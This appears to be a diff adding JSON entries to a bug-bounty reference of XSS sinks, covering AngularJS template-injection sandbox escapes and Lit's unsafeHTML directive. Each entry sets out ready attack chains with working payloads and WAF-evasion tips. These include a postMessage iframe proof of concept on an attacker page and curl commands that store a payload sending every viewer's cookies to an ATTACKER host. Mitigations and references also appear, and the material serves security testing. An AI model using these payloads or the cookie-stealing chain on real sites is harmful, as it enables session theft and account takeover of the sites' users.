+              "payload": "?name={{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(document.domain)')()}}",
+              "command": "open 'https://TARGET/profile?name={{a=%27constructor%27;b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,%27alert(document.domain)%27)()}}' in a browser",
+              "indicator": "the alert fires on 1.2.x targets (escapes for other 1.x minors are published - use the one matching angular.version.full)"
+            }
+          ],
+          "eligibility": "CSTI confirmed with {{7*7}} alone is frequently triaged P4/informational. Acceptance as XSS (P2/P3) requires demonstrating alert() with the correct escape for the target's version; on EOL AngularJS most platforms still accept, though some scope it down for legacy software."
+        },
+        {
+          "source": "location.hash",
+          "steps": [
+            {
+              "action": "Confirm hash-reflected CSTI",
+              "payload": "#{{7*7}}",
+              "command": "open 'https://TARGET/app#{{7*7}}' in a browser",
+              "indicator": "'49' renders where the hash value is echoed inside the ng-app scope"
+            },
+            {
+              "action": "Deliver the version-matched escape via the hash (bypasses server WAF entirely)",
+              "payload": "#{{constructor.constructor('alert(document.domain)')()}}",
+              "command": "open 'https://TARGET/app#{{constructor.constructor('alert(document.domain)')()}}' in a browser (AngularJS >= 1.6 target)",
+              "indicator": "the alert fires; no payload ever appeared in an HTTP request"
+            }
+          ],
+          "eligibility": "Fragment delivery keeps the attack off the server log/WAF - same acceptance rules as the query variant: show code execution, not just arithmetic."
+        }
+      ],
+      "contexts": {
+        "html-body": "Expression injection into compiled DOM: {{ }} is evaluated wherever AngularJS compiles the reflected node.",
+        "attr": "Attributes inside ng-app are compiled too: '?x={{7*7}}' reflected into an attribute still evaluates.",
+        "js-string": "If reflection lands inside an inline script, plain JS injection (';alert(1)//) is usually simpler than CSTI - but the sandbox notes do not apply there."
+      },
+      "waf_notes": "WAFs often flag 'constructor.constructor' - deliver via the fragment, URL-encode quotes, or split with string concatenation inside the expression ({{'con'+'structor'}} style joins are themselves sandbox-filtered on some versions, so prefer transport-level encoding). Hash delivery defeats request inspection entirely.",
+      "eligibility": "Honest verdict: impact scales with version. >= 1.6 and <= 1.1.5 = straightforward JS execution (P2). 1.2-1.5 = JS execution with the correct published escape (P3). Arithmetic-only proof without escape = often downgraded to P4/informational. Always record angular.version.full and the working escape in the report.",
+      "mitigations": [
+        "Migrate off AngularJS 1.x (end-of-life); modern Angular is not vulnerable to expression-sandbox CSTI in this form.",
+        "Never reflect user input into the DOM inside ng-app scopes; sanitize '{{' and '}}' from reflected values.",
+        "Bind user data only through escaped interpolation contexts and deploy a strict CSP with nonces."
+      ],
+      "related": [
+        "$sce.trustAsHtml",
+        "ng-bind-html",
+        "eval",
+        "{{{ }}}"
+      ],
+      "references": [
+        "PortSwigger Research: XSS without HTML - Client-Side Template Injection with AngularJS (Gareth Heyes)",
+        "PortSwigger: Server-side template injection",
+        "HackTricks: Client Side Template Injection (CSTI)"
+      ]
+    },
+    {
+      "id": "sink-lit-unsafehtml",
+      "name": "unsafeHTML",
+      "category": "framework",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "unsafeHTML",
+        "unsafehtml",
+        "unsafe-html",
+        "unsafeStatic",
+        "unsafeSVG"
+      ],
+      "severity": "P2",
+      "severity_note": "P2 as DOM/stored XSS; lit provides no sanitization through this directive. Inline <script> is inert on client insertion but event handlers fire; SSR (lit SSR) emits raw where <script> executes at parse time.",
+      "explain": "Lit escapes all template expressions by default. unsafeHTML(value) from lit/directives/unsafe-html.js is the explicit opt-out: it renders the string as raw HTML inside the template. The sibling unsafeSVG does the same inside SVG contexts, and unsafeStatic (lit-html/static.js) interpolates raw strings into template literals. Any attacker influence over these values is XSS.",
+      "how_it_works": "The directive assigns the string to the DOM like innerHTML on each render: <img src=x onerror=...> and <svg onload=...> fire immediately, inline <script> does not execute client-side, but does execute when present in SSR (lit-labs/ssr) initial output. Lit templates re-render on reactive property changes, so payloads delivered through reactive state (websocket, fetch) detonate without reload. Grep for 'unsafeHTML', 'unsafe-html', 'unsafeStatic' in web-component codebases.",
+      "why_it_matters": "unsafeHTML is the standard way Lit/web-component apps embed rich text, markdown, and third-party widget HTML. It is a clean grep target in review, and web components are increasingly used for exactly the embeddable-widget contexts where third-party (attacker) data flows in.",
+      "exploitable_when": [
+        "fetch-response",
+        "postMessage-data",
+        "websocket-message",
+        "location.search"
+      ],
+      "chains": [
+        {
+          "source": "postMessage-data",
+          "steps": [
+            {
+              "action": "Confirm widget message data reaches unsafeHTML",
+              "payload": "window.postMessage({html:'<b>jlf-trace</b>'},'*')",
+              "command": "in DevTools console on https://TARGET/page run: window.postMessage({html:'<b>jlf-trace</b>'},'*')",
+              "indicator": "a bold 'jlf-trace' renders inside the component's shadow DOM"
+            },
+            {
+              "action": "Deliver from an attacker page embedding the widget",
+              "payload": "<iframe src=https://TARGET/widget onload=\"this.contentWindow.postMessage({html:'<img src=x onerror=alert(document.domain)>'},'*')\">",
+              "command": "host the iframe HTML on https://ATTACKER/poc.html and open it in a browser",
+              "indicator": "the alert fires inside the widget origin"
+            }
+          ],
+          "eligibility": "Accepted when the widget listener lacks a strict origin check - common for embeddable widgets designed to run on third-party sites; check whether postMessage origin validation exists."
+        },
+        {
+          "source": "fetch-response",
+          "steps": [
+            {
+              "action": "Store a marker in the rich-text field rendered via unsafeHTML",
+              "payload": "<u>jlf-trace</u>",
+              "command": "curl -s -X POST 'https://TARGET/api/cards' -H 'Content-Type: application/json' -H 'Cookie: session=SESSION_ID' --data '{\"html\":\"<u>jlf-trace</u>\"}'",
+              "indicator": "the marker renders underlined wherever the card component displays"
+            },
+            {
+              "action": "Store the executable payload",
+              "payload": "<svg onload=fetch('https://ATTACKER/c?c='+document.cookie)>",
+              "command": "curl -s -X POST 'https://TARGET/api/cards' -H 'Content-Type: application/json' -H 'Cookie: session=SESSION_ID' --data '{\"html\":\"<svg onload=fetch(\\'https://ATTACKER/c?c=\\'+document.cookie)>\"}'",
+              "indicator": "the ATTACKER listener receives cookies from every viewer as the component re-renders"
+            }
+          ],
+          "eligibility": "Stored XSS, accepted on all major platforms."
+        }
+      ],
+      "contexts": {
+        "html-body": "Raw insertion on render: event handlers fire immediately; inline <script> inert client-side, live in SSR output.",
+        "attr": "unsafeStatic inside an attribute position: break out with '\"><img src=x onerror=alert(document.domain)>'.",
+        "js-string": "unsafeSVG inside an <svg> context: <a xlink:href=\"javascript:alert(document.domain)\">-style vectors apply alongside onload."
+      },
+      "waf_notes": "Reactive re-renders fed by fetch/websocket/postMessage never pass a request WAF with the payload. Shadow DOM does not impede event-handler execution - do not assume component isolation mitigates it.",
+      "eligibility": "Accepted on all major platforms as DOM/stored XSS. Self-only dashboards (data viewable only by the account that set it) are self-XSS and usually NOT eligible - demonstrate cross-user rendering.",
+      "mitigations": [
+        "Never pass user data through unsafeHTML/unsafeStatic; use default escaped interpolation.",
+        "Sanitize with DOMPurify before the directive: unsafeHTML(DOMPurify.sanitize(v)).",
+        "Nonce-based CSP to block injected handlers in SSR output."
+      ],
+      "related": [
+        "innerHTML",
+        "dangerouslySetInnerHTML",
+        "v-html"
+      ],
+      "references": [
+        "Lit Documentation: unsafeHTML directive",
+        "PortSwigger: DOM-based XSS",
+        "OWASP: XSS Prevention Cheat Sheet"
+      ]
+    }
+  ]
+}
